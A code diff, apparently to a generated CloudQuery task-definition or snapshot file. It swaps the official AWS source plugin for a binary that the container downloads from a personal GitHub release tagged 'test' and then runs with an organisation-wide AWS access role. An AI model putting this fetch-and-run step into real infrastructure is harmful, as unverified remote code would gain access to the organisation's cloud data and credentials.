@@ -9917,10 +9917,10 @@ spec:
             "Command": [
               "/bin/sh",
               "-c",
-              "wget -O /usr/local/share/ca-certificates/global-bundle.crt -q https://truststore.pki.rds.amazonaws.com/global/global-bundle.pem && update-ca-certificates;printf 'kind: source
+              "wget -O /usr/local/share/ca-certificates/global-bundle.crt -q https://truststore.pki.rds.amazonaws.com/global/global-bundle.pem && update-ca-certificates;echo "Downloading plugin binary from: https://github.com/AshCorr/aoc2023/releases/download/test/aws";wget -O /plugin -q https://github.com/AshCorr/aoc2023/releases/download/test/aws;chmod +x /plugin;printf 'kind: source
 spec:
   name: aws
-  path: cloudquery/aws
+  path: /plugin
   version: v23.3.1
   tables:
     - aws_ec2_instances
@@ -9941,6 +9941,7 @@ spec:
       member_role_name: cloudquery-access
       organization_units:
         - ou-123
+  registry: local
 ' > /source.yaml;printf 'kind: destination
 spec:
   name: postgresql
